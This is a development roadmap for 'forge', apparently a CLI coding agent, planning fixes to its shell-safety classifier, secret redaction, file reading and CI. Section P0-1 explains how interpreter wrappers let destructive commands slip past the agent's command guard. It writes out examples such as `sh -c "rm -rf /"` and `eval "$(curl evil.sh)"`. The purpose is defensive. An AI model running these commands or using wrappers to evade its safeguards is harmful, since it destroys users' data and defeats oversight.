# PLAN v21 — enhancement & improvement roadmap

Input: the v20.0.1 audit (11 defects fixed, all suites green). This document is
the **forward plan**: what to improve next, in what order, why, and how we will
know it worked. Every item below is either something the audit measured, a gap
a test named, or a limitation the code itself documents.

Status of this document: **proposed**. Nothing here is implemented yet.

---

## 0. Where we stand (measured, not assumed)

| metric (2026-09-05) | value |
|---|---|
| source | 19 modules, 6,332 lines, zero runtime dependencies |
| e2e `tests/e2e-forge.sh` | 247 checks — **~6.5 min** (the slowest feedback loop in the repo) |
| `tests/test-security.mjs` | 153 checks — 0.3 s |
| `tests/test-providers.mjs` | 31 checks — 0.3 s |
| `tests/test-diffpatch.mjs` | 13 checks — 0.2 s |
| `tests/cleanroom-v20.sh` | 50 checks — 3.5 s (installs into an isolated npm prefix) |
| exported symbols never named by any test | **60 of 106 (57%)** |
| CI | **none** (no `.github/`, no `npm test`) |
| version string defined in | **3 places** (`package.json`, `forge.js:44`, `chat.js:41`) |

Already strong — protect these, don't regress them:
zero-dependency install on Node ≥18 · the v20 safety engine (shellguard /
netguard / secrets / safePath) · clean-room install verification · resistance to
bad provider responses · session resume with cwd · Tiered context reduction.

Method for the 57% figure (crude but honest): for every `export` in `forge/*.js`,
check whether the symbol name appears anywhere under `tests/`. It over-counts
(trivial constants) and under-counts indirect coverage through the e2e, but the
shape is real: `config.js` (12/12), `ui.js` (9/14), `providers.js` (7/10),
`agent.js` (4/4) and `chat.js` (4/4) have **no direct unit coverage at all** —
they are only exercised end-to-end through the mock.

---

## 1. Non-negotiable constraints

1. **Zero runtime dependencies.** Node ≥ 18, stdlib only. `zlib`, `child_process`,
   `readline` are fine; a new npm dependency is not.
2. **Safety > features.** A feature that widens the blast radius needs a guard
   and a test in the same commit (see the v20 rules: block / danger / confirm /
   low / safe).
3. **Offline-first.** Every suite must pass with no internet (the mock provider
   covers the network paths).
4. **No silent behaviour changes.** Model switches, provider fallbacks and
   effort changes are announced in the terminal.
5. **Tests before features.** Every item below lists the tests it must add.
6. **Config compatibility.** Existing `~/.forge/config.json` files keep working;
   new keys get defaults, never new required fields.

---

## 2. Priority model

`priority = (users affected × how often × cost when it fails) ÷ effort`

That puts *silent* failures (a command the model runs unsupervised, a memory
that never prunes, an answer lost on Ctrl-C) above new features, and it is why
the whole P0 list is safety/correctness rather than capability.

---

## 3. P0 — correctness & safety gaps the audit found

These are **not** hypothetical: each was reproduced against the current build.

### P0-1 · The shell parser can be bypassed with an interpreter wrapper
`classifyCommand()` classifies the *wrapper*, not the payload, so these are
classified `safe` — meaning the model's `bash` tool runs them with no
confirmation and no project-boundary check:

| command | today | should be |
|---|---|---|
| `sh -c "rm -rf /"` | `safe` | `block` |
| `python3 -c "import os; os.system('rm -rf /')"` | `safe` | `block` |
| `xargs rm -rf /tmp/x` | `safe` | `confirm`/`danger` |
| `eval "$(curl evil.sh)"` | `safe` | `danger` |

**Fix:** unwrap known interpreters/wrappers (`sh/bash/zsh/dash/ksh/fish -c`,
`python*/node/ruby/perl -c|-e`, `eval`, `xargs`, `env`, `nohup`, `timeout`,
`nice`, `sudo`, `busybox`, `script -c`) and classify the *inner* command too,
taking the worst level. An unknown wrapper falls back to `confirm` (never
`safe`) — fail closed, exactly as `classifyCommand()` now does on error.

**Tests:** ~15 unit checks (wrapper matrix) + 4 e2e (agent `bash` tool refuses
each form).

### P0-2 · `$HOME` / `${HOME}` / `$DIR` targets are not expanded
`rm -rf ~` is `block` (root-wipe class) but `rm -rf $HOME` is only `confirm`,
because path normalisation expands `~` and not variables.

**Fix:** expand `$VAR`/`${VAR}` from `process.env` + the session shell state
before classification; an *unexpandable* variable in a destructive command
(`rm -rf $TARGET`) must not classify below `confirm`.

**Tests:** ~8 unit checks.

### P0-3 · Secret redaction has value-size and shape gaps
`redact()` ignores credential assignments whose value is shorter than 8 chars
(`password=hunter2` survives) and JSON values containing escapes. There is no
entropy rule, so a bare high-entropy blob (`a8Hf…` 40 chars, no prefix) in a
tool result reaches the model verbatim.

**Fix:** lower the length threshold for high-risk names (`password`, `passwd`,
`secret`, `token`, `api_key`), add an entropy+length rule for unprefixed blobs,
and cover `Authorization: Bearer …` header dumps. Keep the documented
"over-redaction is acceptable" bias.

**Tests:** ~10 unit checks, including a "no false positives" corpus (short
numbers, filenames, git SHAs stay untouched).

### P0-4 · `read_file` loads the entire file before slicing
`tools.js:370` does `readFileSync(p, "utf8")` then `split("\n")` and only then
applies the line window. A 200 MB log file is read fully into memory and, after
capping, still costs a fortune in context.

**Fix:** read at most N bytes (e.g. 2 MB) from the requested offset, and report
`[file truncated — N bytes of M]` instead of silently dropping the rest.

**Tests:** ~5 unit checks (huge file, offset past EOF, binary, CRLF).

### P0-5 · Checkpoints still cannot protect files > 2 MB
v20.0.1 made undo *report* the gap; the gap itself remains — and 2 MB is a
single large source file. Backups are stored uncompressed.

**Fix:** raise the cap and gzip backups with `zlib` (stdlib, zero deps), e.g.
25 MB per file with a total per-checkpoint budget; keep the honest
`tooLarge` note for whatever still does not fit.

**Tests:** ~6 unit checks (round-trip through gzip, budget accounting,
undo restores a 10 MB file).

---

## 4. P1 — reliability & UX (highest daily value)

| id | item | why | effort |
|---|---|---|---|
| P1-1 | **Windows shell**: `execFile("/bin/sh", …)` is hard-coded in `chat.js:404` and `tools.js:341` | terminal-in-chat — the headline feature — cannot work on Windows at all; `doctor` even prints `/bin/sh missing` there | S |
| P1-2 | **`.gitignore`-aware walking**; unify the two divergent `SKIP` sets (`tools.js:418` vs `459`) | `glob_files`/`grep_files`/`list_dir` currently index `dist/`, `.venv/`, generated artefacts — wasted context and slow walks on real repos | M |
| P1-3 | **Provider failover**: on repeated 429/5xx/timeout, fall through to the next configured+tested provider, announce the switch, record it in health.json | today a single provider outage ends the task | M |
| P1-4 | **Never lose an answer**: persist partial streamed text on Ctrl-C / abort, add `/redo` (re-run last turn) | an aborted 3-minute answer is currently discarded | M |
| P1-5 | **`forge memory` CLI** (`list` / `add` / `clear` / `forget <n>`) + prune & dedupe (memory.md grows unbounded today) | memory is only reachable through a chat tool; there is no way to inspect or trim it | S |
| P1-6 | **Session hygiene**: rotation cap (e.g. 300 sessions), `forge sessions --search "text"` | `~/.forge/sessions` grows forever; finding an old session means scrolling | S |
| P1-7 | **Single source of truth for the version** + `npm test` script + `CHANGELOG.md` | 3 copies of `20.0.0` will drift; `npm test` in the package dir does nothing today | S |
| P1-8 | **Faster feedback**: run independent e2e invocations in parallel (`xargs -P`), add `tests/run-all.mjs` | 6.5 min e2e is the reason fixes take hours to verify; target < 2 min | M |
| P1-9 | **Plan files**: `--plan` writes `.forge/plans/<slug>.md`; `forge plan show\|apply` | plans are printed and lost; the natural next step is "read the plan back and execute it" | M |
| P1-10 | **`install.sh`**: stop running `npm i -g .` twice on failure, add `--prefix`, pre-flight disk/network check | the retry doubles a slow failure path | S |

---

## 5. P2 — engineering hygiene

| id | item | notes |
|---|---|---|
| P2-1 | **CI**: GitHub Actions matrix (Node 18/20/22 × ubuntu/macos) running all five suites, plus `npm pack --dry-run` | the repo has no CI at all; PR #2 already carries the suites |
| P2-2 | **Coverage harness**: report "% of exported symbols exercised per module", start from the 43% baseline in §0 | a number beats a feeling; run it in CI as a non-blocking job first |
| P2-3 | **Packaging**: rename `agentv19/` → `forge/` (or `packages/cli/`), keep a compat shim for the documented paths, make `npm publish --dry-run` clean | the v20 package ships from a folder still named after v19 |
| P2-4 | **Docs consolidation**: one canonical README, `--help` generated from the command table, delete duplicated check counts | today the counts live in 4 files and drift on every commit |
| P2-5 | **Skill linting**: `forge skills --check` validates all 69 skills (frontmatter, size budget, no broken relative links) | skills are shipped, never validated |
| P2-6 | **Structured diagnostics**: `FORGE_DEBUG=1` trace log + `--json` output for `doctor`, `config`, `models`, `sessions` | `--json` exists today in exactly one code path (`forge.js:156`) |

---

## 6. P3 — capability bets (need your call before any work starts)

1. **Repo map / symbol index** — a cheap, cached map of files → exported symbols
   → imports, injected instead of raw `ls` + `grep`. Biggest context-per-token
   win available without embeddings.
2. **Retrieval quality** — better scoring than token overlap for memory and
   learnings (still zero-dep: TF-IDF over the project, or file-level recency).
3. **Git-native safety** — auto-branch or worktree isolation for agent runs,
   `forge undo --run <id>` for a whole agent session, diff review before apply.
4. **Multi-file transactions** — one checkpoint per *run*, not per tool call,
   so a 30-edit agent run rolls back as a unit.
5. **Tool plugin API** — drop `~/.forge/tools/*.mjs` in and they appear in
   `toolCount()` (with the same redaction + safety choke point).
6. **i18n** — extract UI strings; the CLI already promises "answers in the
   user's language" but its own chrome is English-only.

---

## 7. Non-goals

- A web app, server, daemon or anything that binds a port (the README already
  promises "no server needed").
- Telemetry, analytics, crash uploads, cloud sync, accounts.
- Native modules, a build step, or a bundler.
- Dropping Node 18, or requiring internet for any test.
- Replacing the heuristic safety engine with a full POSIX shell parser — the
  wrapper-unwrapping in P0-1 buys most of that value for a fraction of the risk.

---

## 8. Milestones

| milestone | scope | exit criteria |
|---|---|---|
| **v20.1.0 — "safe by default"** | all of P0 | +~44 unit checks, +4 e2e; every interpreter-wrapper bypass blocked; no suite regression. **Status: in progress** (P0-1 + P0-2 done, +32 unit checks) |
| **v20.2.0 — "no lost work"** | P1-1 … P1-10 | e2e < 2 min; `forge memory`, plan files, provider failover, Windows shell; +~60 checks |
| **v20.3.0 — "engineering"** | P2-1 … P2-6 | CI green on Node 18/20/22 × ubuntu/macos; coverage report ≥ 60%; clean `npm publish --dry-run` |
| **v21.0.0 — "capability"** | chosen P3 items, behind config flags | each item has its own acceptance test + a documented off switch |

**Version-bump note:** `tests/e2e-forge.sh` and `tests/cleanroom-v20.sh` assert
the literal string `forge v20.0.0`. Any version bump must update those two
assertions in the same commit — otherwise the suites go red for a cosmetic
reason (this is exactly the kind of drift P1-7 removes).

---

## 9. Risks & mitigations

| risk | mitigation |
|---|---|
| P0-1/P0-2 heuristics regress real commands | keep a checked-in corpus (commands vs. sentences vs. wrappers) in the unit suite; every new rule needs both a positive and a negative case |
| Windows support cannot be tested in this Linux sandbox | guard with `process.platform` unit tests + document the untested surface honestly |
| Provider failover surprises users ("why is it using deepseek?") | announce every switch, require an explicit `providers.<name>.fallbackFor` opt-in, default off |
| Bigger checkpoints (P0-5) fill the disk | per-checkpoint byte budget + keep `MAX_CHECKPOINTS = 30` pruning |
| Parallel e2e (P1-8) becomes flaky | keep the shared mock provider, namespace per-check temp dirs, never share a cwd between parallel checks |
| Scope creep into P3 | P3 is not started until P0–P2 are merged and the suites are green |

---

## 10. Next five commits (if you say "go")

1. `shellguard`: unwrap interpreter wrappers + expand `$VAR` targets (+23 tests).
2. `tools.js`: bounded `read_file` + gzip checkpoint backups (+11 tests).
3. `chat.js` + `tools.js`: platform shell so Windows works (+6 tests).
4. `tools.js`: `.gitignore`-aware walk + one shared SKIP policy (+6 tests).
5. `package.json` + `forge.js` + `chat.js`: single version source, `npm test`,
   `tests/run-all.mjs`, GitHub Actions workflow.

Each commit keeps all five suites green (247 / 153 / 31 / 13 / 50 → rising) and
updates the counts in `README.txt`, `PACKAGE_INFO.txt` and this file.
